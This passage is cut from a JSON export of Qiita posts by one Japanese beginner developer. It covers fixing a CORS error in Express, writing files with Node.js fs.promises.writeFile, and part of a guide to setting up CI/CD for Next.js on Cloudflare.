${port}`);\n});\n\n```\n\n`cors`パッケージを使うとより簡単に定義できます。\n\n```ts\nimport express from \"express\";\nimport { generatePortfolioFile } from \"./scripts/savePortfolio.ts\";\nimport cors from \"cors\";\n\nconst app = express();\nconst port = 3000;\n\napp.use(\n  cors({\n    origin: \"http://localhost:5173\", // http://localhost:5173のオリジンを許可\n  })\n);\n\napp.post(\"/api/generate-portfolio\", async (req, res) => {\n  const { qiitaId, githubId } = req.body;\n\n  try {\n    await generatePortfolioFile(qiitaId, githubId);\n    res.status(200).send(\"Portfolio generated successfully\");\n  } catch (error) {\n    res.status(500).send(\"Failed to generate portfolio\");\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Example app listening on port ${port}`);\n});\n\n```\n\n# おわりに\nエラーを通してCORSの仕組みを学ぶことができました。\n技術書を読んだだけでは理解しづらい概念もエラーを通して学ぶと理解度が上がると感じた出来事でした。\n\n# 参考\n\nhttps://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy#%E7%95%B0%E3%81%AA%E3%82%8B%E3%82%AA%E3%83%AA%E3%82%B8%E3%83%B3%E3%81%B8%E3%81%AE%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9\n\nhttps://gihyo.jp/book/2024/978-4-297-14571-2\n\nhttps://developer.mozilla.org/ja/docs/Web/HTTP/Guides/CORS\n\nhttps://qiita.com/kaisei_siratama/items/b7f88a661eb21b2bd0b5\n\nhttps://creative.liberta-inc.com/blog/hhow-to-enable-cors-in-express/\n","coediting":false,"comments_count":0,"created_at":"2025-08-17T11:32:11+09:00","group":null,"id":"3656870e41004321655a","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Node.js","versions":[]},{"name":"初心者","versions":[]},{"name":"CORS","versions":[]}],"title":"【CORS】Access to fetch at 'http://localhost:3000/api/' from origin 'http://localhost:5173' has been blocked by CORS policyエラーが発生する","updated_at":"2025-08-17T11:32:11+09:00","url":"https://qiita.com/asa129/items/3656870e41004321655a","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":581,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:85\">受け取ったMarkdown形式で記載したデータのファイルを作成、保存したいと考えていました。<br>\nNode.jsで書き込みを行う方法について学んだことをまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:23\">\n<span id=\"実現したいこと\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E7%8F%BE%E3%81%97%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>実現したいこと</h1>\n<p data-sourcepos=\"6:1-6:108\">受け取ったデータを元にファイル作成を行い、ローカルフォルダに保存したい。</p>\n<h1 data-sourcepos=\"8:1-8:14\">\n<span id=\"実現方法\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E7%8F%BE%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>実現方法</h1>\n<p data-sourcepos=\"9:1-9:34\"><strong>fs.promises.writeFile</strong>を使う</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"11:1-21:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">fs</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">fs</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">generateFile</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n      <span class=\"kd\">const</span> <span class=\"nx\">filename</span><span class=\"p\">:</span> <span class=\"kr\">string</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">./XXXX.txt</span><span class=\"dl\">\"</span>\n      <span class=\"kd\">const</span> <span class=\"nx\">data</span><span class=\"p\">:</span> <span class=\"kr\">string</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">ファイルに書き込む内容</span><span class=\"dl\">\"</span>\n      <span class=\"k\">await</span> <span class=\"nx\">fs</span><span class=\"p\">.</span><span class=\"nx\">promises</span><span class=\"p\">.</span><span class=\"nf\">writeFile</span><span class=\"p\">(</span><span class=\"nx\">filename</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"p\">{</span> <span class=\"na\">encoding</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">utf-8</span><span class=\"dl\">\"</span> <span class=\"p\">});</span>\n<span class=\"p\">}</span>\n\n<span class=\"nf\">generateFile</span><span class=\"p\">();</span>\n</code></pre></div></div>\n<ul data-sourcepos=\"23:1-26:0\">\n<li data-sourcepos=\"23:1-23:71\">\n<code>filename</code>: ファイル名やファイルの配置先パスを指定</li>\n<li data-sourcepos=\"24:1-24:43\">\n<code>data</code>: ファイルに書き込む内容</li>\n<li data-sourcepos=\"25:1-26:0\">\n<code>{options}</code>: 任意で指定（{options}自体が任意）</li>\n</ul>\n<p data-sourcepos=\"0:0-0:0\"><strong>optionsに指定できるもの</strong></p>\n<table data-sourcepos=\"27:1-34:92\">\n<thead>\n<tr data-sourcepos=\"27:1-27:97\">\n<th data-sourcepos=\"27:38-27:54\">オプション</th>\n<th data-sourcepos=\"27:56-27:75\">デフォルト値</th>\n<th data-sourcepos=\"27:77-27:84\">説明</th>\n<th data-sourcepos=\"27:86-27:96\">使用例</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"30:1-30:66\">\n<td data-sourcepos=\"30:2-30:11\">encoding</td>\n<td data-sourcepos=\"30:13-30:21\">'utf-8'</td>\n<td data-sourcepos=\"30:23-30:39\">文字コード</td>\n<td data-sourcepos=\"30:41-30:65\"><code>{ encoding: 'utf-8' }</code></td>\n</tr>\n<tr data-sourcepos=\"31:1-31:99\">\n<td data-sourcepos=\"31:2-31:7\">mode</td>\n<td data-sourcepos=\"31:9-31:15\">0o666</td>\n<td data-sourcepos=\"31:17-31:36\">ファイル権限</td>\n<td data-sourcepos=\"31:38-31:98\">\n<code>{ mode: 0o666 }</code> (どのユーザーも読み書き可能)</td>\n</tr>\n<tr data-sourcepos=\"32:1-32:76\">\n<td data-sourcepos=\"32:2-32:7\">flag</td>\n<td data-sourcepos=\"32:9-32:13\">'w'</td>\n<td data-sourcepos=\"32:15-32:37\">書き込みモード</td>\n<td data-sourcepos=\"32:39-32:75\">\n<code>{ flag: 'a' }</code> (追記モード)</td>\n</tr>\n<tr data-sourcepos=\"33:1-33:67\">\n<td data-sourcepos=\"33:2-33:8\">flush</td>\n<td data-sourcepos=\"33:10-33:16\">false</td>\n<td data-sourcepos=\"33:18-33:46\">書き込み完了を保証</td>\n<td data-sourcepos=\"33:48-33:66\"><code>{ flush: true }</code></td>\n</tr>\n<tr data-sourcepos=\"34:1-34:92\">\n<td data-sourcepos=\"34:2-34:9\">signal</td>\n<td data-sourcepos=\"34:11-34:13\">-</td>\n<td data-sourcepos=\"34:15-34:46\">途中キャンセルが可能</td>\n<td data-sourcepos=\"34:48-34:91\">AbortControllerと組み合わせて使用</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"36:1-36:35\"><strong>modeの設定は下記を参照</strong></p>\n<p data-sourcepos=\"38:1-38:41\"><iframe id=\"qiita-embed-content__257969ea5df5b94cb1bbe31eebe33835\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__257969ea5df5b94cb1bbe31eebe33835\" data-content=\"https%3A%2F%2Fnodejs.org%2Fapi%2Ffs.html%23file-modes\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"40:1-40:32\"><strong>flagの指定は下記参照</strong></p>\n<p data-sourcepos=\"42:1-42:48\"><iframe id=\"qiita-embed-content__2c15200bb433598ecfd9f06248d4414c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2c15200bb433598ecfd9f06248d4414c\" data-content=\"https%3A%2F%2Fnodejs.org%2Fapi%2Ffs.html%23file-system-flags\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"44:1-44:22\"><strong>とりいれた例</strong></p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"46:1-66:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">fs</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">fs</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">generatePortfolioFile</span><span class=\"p\">(</span><span class=\"nx\">qiitaId</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">,</span> <span class=\"nx\">githubId</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// データ取得処理（省略）</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">response</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">fetch</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">http://localhost:3141/agents/main-agent/text</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">{});</span>\n  <span class=\"c1\">// レスポンス変換</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">res</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">response</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">())</span> <span class=\"kd\">as </span><span class=\"p\">{</span>\n    <span class=\"nl\">data</span><span class=\"p\">:</span> <span class=\"p\">{</span> <span class=\"na\">provider</span><span class=\"p\">:</span> <span class=\"p\">{</span> <span class=\"na\">text</span><span class=\"p\">:</span> <span class=\"kr\">string</span> <span class=\"p\">}</span> <span class=\"p\">};</span>\n  <span class=\"p\">};</span>\n  <span class=\"c1\">// レスポンスから使用したいデータのみ取得</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">text</span> <span class=\"o\">=</span> <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">provider</span><span class=\"p\">.</span><span class=\"nx\">text</span><span class=\"p\">;</span>\n\n  <span class=\"c1\">// ファイル名作成（qiitaId_githubId.md）</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">filename</span> <span class=\"o\">=</span> <span class=\"s2\">`</span><span class=\"p\">${</span><span class=\"nx\">qiitaId</span><span class=\"p\">}</span><span class=\"s2\">_</span><span class=\"p\">${</span><span class=\"nx\">githubId</span><span class=\"p\">}</span><span class=\"s2\">.md`</span><span class=\"p\">;</span>\n  <span class=\"c1\">// ファイル作成</span>\n  <span class=\"k\">await</span> <span class=\"nx\">fs</span><span class=\"p\">.</span><span class=\"nx\">promises</span><span class=\"p\">.</span><span class=\"nf\">writeFile</span><span class=\"p\">(</span><span class=\"s2\">`./outputs/</span><span class=\"p\">${</span><span class=\"nx\">filename</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">,</span> <span class=\"nx\">text</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nf\">generatePortfolioFile</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">asa129</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">asa129</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n</code></pre></div></div>\n<p data-sourcepos=\"68:1-68:30\">作成されていました。</p>\n<p data-sourcepos=\"70:1-70:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F466d0fce-9b26-4623-bc05-ee63aa604aff.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c265c728cc0f63f7df37f85819a5e1b1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F466d0fce-9b26-4623-bc05-ee63aa604aff.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c265c728cc0f63f7df37f85819a5e1b1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F466d0fce-9b26-4623-bc05-ee63aa604aff.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=97c497ecca1ee196408be3ea2e5deb4a 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/466d0fce-9b26-4623-bc05-ee63aa604aff.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"72:1-72:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"73:1-75:111\">最初にドキュメントを読んで理解しようとしたところ、内容の煩雑さに圧倒されてしまいました。<br>\n様々な記事でわかりやすい解説があるため、それらを読んでから再度ドキュメントを確認すると理解しやすいなと思いました。<br>\n上書き保存や、削除などの操作や、ディレクトリ操作についても挑戦したいです。</p>\n<h1 data-sourcepos=\"77:1-77:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"79:1-79:67\"><iframe id=\"qiita-embed-content__1c854f18899b30774c719746d0d87363\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1c854f18899b30774c719746d0d87363\" data-content=\"https%3A%2F%2Fnodejs.org%2Fapi%2Ffs.html%23fspromiseswritefilefile-data-options\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"81:1-81:55\"><iframe id=\"qiita-embed-content__b7a671fd142bfaec2638d363341b24d9\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__b7a671fd142bfaec2638d363341b24d9\" data-content=\"https%3A%2F%2Fq-az.net%2Fnode-js-file-read-write-append-unlink%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"83:1-83:41\"><iframe id=\"qiita-embed-content__d96a9cc6ce1512bb14e00ba6ffa2b705\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d96a9cc6ce1512bb14e00ba6ffa2b705\" data-content=\"https%3A%2F%2Fnodejs.org%2Fapi%2Ffs.html%23file-modes\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n受け取ったMarkdown形式で記載したデータのファイルを作成、保存したいと考えていました。\nNode.jsで書き込みを行う方法について学んだことをまとめます。\n\n# 実現したいこと\n受け取ったデータを元にファイル作成を行い、ローカルフォルダに保存したい。\n\n# 実現方法\n**fs.promises.writeFile**を使う\n\n```ts\nimport fs from \"fs\";\n\nasync function generateFile() {\n      const filename: string = \"./XXXX.txt\"\n      const data: string = \"ファイルに書き込む内容\"\n      await fs.promises.writeFile(filename, data, { encoding: \"utf-8\" });\n}\n\ngenerateFile();\n```\n\n* `filename`: ファイル名やファイルの配置先パスを指定\n* `data`: ファイルに書き込む内容\n* `{options}`: 任意で指定（{options}自体が任意）\n\n**optionsに指定できるもの**\n| オプション | デフォルト値 | 説明 | 使用例 |\n|-----------|------------|------|--------|\n| encoding | 'utf-8' | 文字コード | `{ encoding: 'utf-8' }` |\n| mode | 0o666 | ファイル権限 | `{ mode: 0o666 }` (どのユーザーも読み書き可能) |\n| flag | 'w' | 書き込みモード | `{ flag: 'a' }` (追記モード)   |\n| flush | false | 書き込み完了を保証 | `{ flush: true }` |\n| signal | - | 途中キャンセルが可能 | AbortControllerと組み合わせて使用 |\n\n**modeの設定は下記を参照**\n\nhttps://nodejs.org/api/fs.html#file-modes\n\n**flagの指定は下記参照**\n\nhttps://nodejs.org/api/fs.html#file-system-flags\n\n**とりいれた例**\n\n```ts\nimport fs from \"fs\";\n\nasync function generatePortfolioFile(qiitaId: string, githubId: string) {\n  // データ取得処理（省略）\n  const response = await fetch(\"http://localhost:3141/agents/main-agent/text\", {});\n  // レスポンス変換\n  const res = (await response.json()) as {\n    data: { provider: { text: string } };\n  };\n  // レスポンスから使用したいデータのみ取得\n  const text = res.data.provider.text;\n\n  // ファイル名作成（qiitaId_githubId.md）\n  const filename = `${qiitaId}_${githubId}.md`;\n  // ファイル作成\n  await fs.promises.writeFile(`./outputs/${filename}`, text);\n}\n\ngeneratePortfolioFile(\"asa129\", \"asa129\");\n```\n\n作成されていました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/466d0fce-9b26-4623-bc05-ee63aa604aff.png)\n\n# おわりに\n最初にドキュメントを読んで理解しようとしたところ、内容の煩雑さに圧倒されてしまいました。\n様々な記事でわかりやすい解説があるため、それらを読んでから再度ドキュメントを確認すると理解しやすいなと思いました。\n上書き保存や、削除などの操作や、ディレクトリ操作についても挑戦したいです。\n\n# 参考\n\nhttps://nodejs.org/api/fs.html#fspromiseswritefilefile-data-options\n\nhttps://q-az.net/node-js-file-read-write-append-unlink/\n\nhttps://nodejs.org/api/fs.html#file-modes\n","coediting":false,"comments_count":0,"created_at":"2025-08-14T15:53:56+09:00","group":null,"id":"9eb014b07e9b02873d24","likes_count":3,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"Node.js","versions":[]},{"name":"初心者","versions":[]},{"name":"TypeScript","versions":[]}],"title":"【Node.js + TypeScript】Node.jsでファイルの新規作成を行う","updated_at":"2025-08-14T15:53:56+09:00","url":"https://qiita.com/asa129/items/9eb014b07e9b02873d24","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":553,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:205\">前回、FirebaseAppHostingを使ってNext.jsプロジェクトのCI/CDに挑戦しました。<br>\nコミュニティ内で「Cloudflareが熱いよ！」と教えてもらい、Cloudflareを使ったCI/CD環境の構築に挑戦してみました。備忘録として調べたことをまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"前提\" class=\"fragment\"></span><a href=\"#%E5%89%8D%E6%8F%90\"><i class=\"fa fa-link\"></i></a>前提</h1>\n<p data-sourcepos=\"6:1-6:87\">本記事では以下の設定が完了していることを前提としています。</p>\n<ul data-sourcepos=\"7:1-11:0\">\n<li data-sourcepos=\"7:1-7:42\">Next.jsプロジェクトが作成済み</li>\n<li data-sourcepos=\"8:1-8:48\">Cloudflare、GitHubアカウント作成済み</li>\n<li data-sourcepos=\"9:1-9:88\">Next.jsのプロジェクトをCloudflareを使ってCLIでデプロイできる状態</li>\n<li data-sourcepos=\"10:1-11:0\">Jestによるテスト環境が構築済み</li>\n</ul>\n<p data-sourcepos=\"12:1-12:69\">設定方法は下記のドキュメントを参考にしました。</p>\n<p data-sourcepos=\"14:1-14:75\"><iframe id=\"qiita-embed-content__45c2da9d2106352eb9ec3deac13a918f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__45c2da9d2106352eb9ec3deac13a918f\" data-content=\"https%3A%2F%2Fdevelopers.cloudflare.com%2Fworkers%2Fframework-guides%2Fweb-apps%2Fnextjs%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"16:1-16:52\">\n<span id=\"1cloudflareでの自動デプロイ設定cd\" class=\"fragment\"></span><a href=\"#1cloudflare%E3%81%A7%E3%81%AE%E8%87%AA%E5%8B%95%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E8%A8%AD%E5%AE%9Acd\"><i class=\"fa fa-link\"></i></a>1.Cloudflareでの自動デプロイ設定（CD）</h1>\n<p data-sourcepos=\"17:1-17:103\">Cloudflareコンソールにログイン後、Account Home画面で対象のプロジェクトを選択</p>\n<p data-sourcepos=\"19:1-19:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F47b08a11-cc31-46de-8044-63641fb41872.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=844bf7181b94beb2524338ce656ebebb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F47b08a11-cc31-46de-8044-63641fb41872.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=844bf7181b94beb2524338ce656ebebb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F47b08a11-cc31-46de-8044-63641fb41872.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=401025ae15248601f79288b93c4a3c0d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/47b08a11-cc31-46de-8044-63641fb41872.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"21:1-21:17\">Settingsを選択</p>\n<p data-sourcepos=\"23:1-23:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0f7d23f6-3a30-44ff-97d5-b20500645383.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8434a2eebcf248492fc810ce7009b49b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0f7d23f6-3a30-44ff-97d5-b20500645383.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8434a2eebcf248492fc810ce7009b49b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0f7d23f6-3a30-44ff-97d5-b20500645383.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5b3a400b830546602df9754eb97a7350 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0f7d23f6-3a30-44ff-97d5-b20500645383.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"25:1-26:60\">画面を下へスクロールすると、<code>Build</code>項目があります。<br>\nGitHub連携を行い、リポジトリを指定します。</p>\n<p data-sourcepos=\"28:1-28:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc13bf3a2-b1c5-42c6-bd4f-4b6c06b1d9ca.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bf9b9e9357bc9d2b64a6b686ced75dd4\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc13bf3a2-b1c5-42c6-bd4f-4b6c06b1d9ca.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bf9b9e9357bc9d2b64a6b686ced75dd4\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc13bf3a2-b1c5-42c6-bd4f-4b6c06b1d9ca.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5e626b88bb724f6a9096b8587498a02e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c13bf3a2-b1c5-42c6-bd4f-4b6c06b1d9ca.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"30:1-31:116\">Build configurationの編集ボタンを押下し、コマンドを登録します。<br>\n<code>Deploy command</code>にpackage.jsonにて指定したdeployコマンドから<code>npm run deploy</code>を指定、Updateで登録</p>\n<p data-sourcepos=\"33:1-33:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa0ade10b-a86e-43fb-981c-f3e4de69c494.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bee1a13a4df3a2fb29d3802366078be8\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa0ade10b-a86e-43fb-981c-f3e4de69c494.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bee1a13a4df3a2fb29d3802366078be8\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa0ade10b-a86e-43fb-981c-f3e4de69c494.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=12f3bfd79eeb63d1b21eee7f556ca44f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a0ade10b-a86e-43fb-981c-f3e4de69c494.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"35:1-35:65\">Deploymentsタブでビルド時のログを確認できます。</p>\n<p data-sourcepos=\"37:1-37:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F06c5dd7b-1e1b-4050-91c6-8ad03fb0ce95.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a8032525ffbafdccd071c847933d7662\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F06c5dd7b-1e1b-4050-91c6-8ad03fb0ce95.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a8032525ffbafdccd071c847933d7662\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F06c5dd7b-1e1b-4050-91c6-8ad03fb0ce95.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=71359cfc897e34815ebf17313cb10f8a 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/06c5dd7b-1e1b-4050-91c6-8ad03fb0ce95.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"39:1-39:42\">\n<span id=\"2テスト自動実行の設定ci\" class=\"fragment\"></span><a href=\"#2%E3%83%86%E3%82%B9%E3%83%88%E8%87%AA%E5%8B%95%E5%AE%9F%E8%A1%8C%E3%81%AE%E8%A8%AD%E5%AE%9Aci\"><i class=\"fa fa-link\"></i></a>2.テスト自動実行の設定（CI）</h1>\n<p data-sourcepos=\"41:1-41:111\">デプロイ前にテストを実行するため、package.jsonにpre実行コマンドを追加しました。</p>\n<div class=\"code-frame\" 